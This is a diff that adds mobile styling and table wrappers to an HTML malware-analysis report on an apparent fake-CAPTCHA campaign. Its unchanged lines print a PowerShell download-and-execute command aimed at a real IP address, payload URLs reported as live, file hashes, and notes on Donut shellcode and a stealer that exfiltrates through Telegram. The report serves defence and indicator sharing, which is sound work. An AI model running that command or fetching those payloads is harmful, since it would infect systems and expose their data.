@@ -195,6 +195,8 @@
             font-family: 'Consolas', 'Monaco', monospace;
             font-size: 0.9em;
             overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            overflow-x: auto;
             white-space: pre-wrap;
             word-wrap: break-word;
         }
@@ -209,6 +211,12 @@
         }
         
         /* Tables */
+        .table-wrapper {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 15px 0;
+        }
+        
         table {
             width: 100%;
             border-collapse: collapse;
@@ -379,6 +387,68 @@
             body { background: white; color: black; }
             .evidence-box img { max-height: 400px; object-fit: contain; }
         }
+        
+        /* Mobile Responsive Styles */
+        @media screen and (max-width: 768px) {
+            .container { padding: 10px; }
+            
+            header { padding: 30px 15px; }
+            header h1 { font-size: 1.5em; }
+            .subtitle { font-size: 0.95em; }
+            
+            /* Make tables scrollable on mobile */
+            .table-wrapper {
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+                margin: 15px 0;
+            }
+            
+            table {
+                min-width: 500px;
+                font-size: 0.85em;
+            }
+            
+            th, td {
+                padding: 8px 10px;
+                white-space: nowrap;
+            }
+            
+            /* Code blocks */
+            .code-block { font-size: 0.8em; }
+            .code-content { 
+                overflow-x: auto;
+                white-space: pre;
+            }
+            
+            /* Section headers */
+            .section-header h2 { font-size: 1.3em; }
+            
+            /* Evidence boxes */
+            .evidence-box { margin: 15px 0; }
+            .evidence-caption { font-size: 0.85em; }
+            
+            /* Highlight boxes */
+            .highlight-box { padding: 15px; }
+            .highlight-box h3 { font-size: 1em; }
+            
+            /* Tags */
+            .tag { font-size: 0.7em; padding: 3px 8px; }
+            
+            /* IOC values */
+            .ioc-value { font-size: 0.75em; word-break: break-all; }
+            
+            /* Meta grid */
+            .meta-grid { grid-template-columns: repeat(2, 1fr); }
+            .meta-item { padding: 12px; }
+            .meta-item .value { font-size: 0.95em; }
+        }
+        
+        @media screen and (max-width: 480px) {
+            header h1 { font-size: 1.2em; }
+            .meta-grid { grid-template-columns: 1fr; }
+            table { min-width: 400px; }
+            .section-header h2 { font-size: 1.1em; }
+        }
     </style>
 </head>
 <body>
@@ -492,7 +562,7 @@
                     <div class="code-content">powershell -c iex(irm 158.94.209.33 -UseBasicParsing)</div>
                 </div>
                 
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Component</th>
                         <th>Meaning</th>
@@ -518,7 +588,7 @@
                         <td>Invoke-Expression</td>
                         <td>Execute downloaded code</td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
@@ -567,7 +637,7 @@
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">Key Techniques Summary (Stage 1 & 2)</h3>
                 <p>The following table summarizes the evasion and execution techniques used across both PowerShell stages:</p>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Stage</th>
                         <th>Technique</th>
@@ -616,7 +686,7 @@
                         <td><code>WaitForSingleObject($th, 30000)</code></td>
                         <td>Wait 30 seconds for shellcode completion</td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
@@ -810,7 +880,7 @@ taskkill /F /IM loader.exe</div>
                 </div>
                 
                 <h3 style="color: var(--accent); margin-top: 20px;">Key Strings Extracted</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Category</th>
                         <th>Strings Found</th>
@@ -841,7 +911,7 @@ taskkill /F /IM loader.exe</div>
                         <td><code>Clipboard</code>, <code>Screenshot</code>, <code>Cookies</code></td>
                         <td>Active data theft</td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
@@ -877,7 +947,7 @@ E8 C0 E5 00 00 C0 E5 00 00 DF 3E C3 CB F9 F1 E1...</div>
                 </div>
                 
                 <h3 style="color: var(--accent); margin-top: 20px;">Donut Signature Comparison</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>File</th>
                         <th>First 5 Bytes</th>
@@ -896,7 +966,7 @@ E8 C0 E5 00 00 C0 E5 00 00 DF 3E C3 CB F9 F1 E1...</div>
                         <td>CALL +0xE5C0</td>
                         <td><span class="tag tag-danger">Donut</span></td>
                     </tr>
-                </table>
+                </table></div>
                 <p style="margin-top: 10px; color: var(--text-muted); font-size: 0.9em;">
                     Both files start with <code>E8</code> (x86 CALL instruction) — the characteristic Donut shellcode signature.
                 </p>
@@ -930,7 +1000,7 @@ E8 C0 E5 00 00 C0 E5 00 00 DF 3E C3 CB F9 F1 E1...</div>
                             <td><strong>Family Labels</strong></td>
                             <td><code>donut</code>, <code>marte</code>, <code>shellcode</code></td>
                         </tr>
-                    </table>
+                    </table></div>
                 </div>
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">.NET Assembly Proof</h3>
@@ -974,7 +1044,7 @@ cptchbuild_dmp_output.txt:68833:SendMessage</div>
                 </div>
                 
                 <h3 style="color: var(--accent); margin-top: 20px;">.NET Evidence Summary</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Pattern Found</th>
                         <th>What It Proves</th>
@@ -1005,7 +1075,7 @@ cptchbuild_dmp_output.txt:68833:SendMessage</div>
                         <td>Telegram Bot API</td>
                         <td>Data exfiltration method</td>
                     </tr>
-                </table>
+                </table></div>
                 
                 <div class="highlight-box" style="border-color: var(--accent2); margin-top: 25px;">
                     <h3 style="color: var(--accent2);">Conclusion: cs.bin Contains .NET Info Stealer</h3>
@@ -1139,7 +1209,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                             <td><span class="tag tag-danger">LIVE (HTTP 200)</span></td>
                             <td>Payload Server (cptch.bin, cptchbuild.bin, cs.bin)</td>
                         </tr>
-                    </table>
+                    </table></div>
                 </div>
                 
                 <p style="margin-top: 20px;">
@@ -1158,7 +1228,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
             </div>
             <div class="section-content">
                 <h3 style="color: var(--accent);">Network Indicators</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Stage</th>
                         <th>IP Address</th>
@@ -1195,10 +1265,10 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>/user_profiles_photo/cs.bin</td>
                         <td>Info stealer</td>
                     </tr>
-                </table>
+                </table></div>
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">File Indicators</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Filename</th>
                         <th>SHA256</th>
@@ -1219,7 +1289,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td><span class="ioc-value" style="font-size: 0.7em;">8A1DB4433E20B71698F63199B97C8A94DDA167CB24A169B0FC1092B1FB5E3CE0</span></td>
                         <td>84,043 bytes</td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
@@ -1230,7 +1300,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                 <h2>MITRE ATT&CK Mapping</h2>
             </div>
             <div class="section-content">
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Technique ID</th>
                         <th>Name</th>
@@ -1281,7 +1351,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Exfiltration Over Web Service</td>
                         <td>Telegram Bot API exfiltration</td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
@@ -1304,7 +1374,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                 </ul>
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">Recommendations</h3>
-                <table>
+                <div class="table-wrapper"><table>
                     <tr>
                         <th>Action</th>
                         <th>Priority</th>
@@ -1329,7 +1399,7 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Educate users: legitimate CAPTCHAs never require running commands</td>
                         <td><span class="tag tag-warning">MEDIUM</span></td>
                     </tr>
-                </table>
+                </table></div>
             </div>
         </section>
 
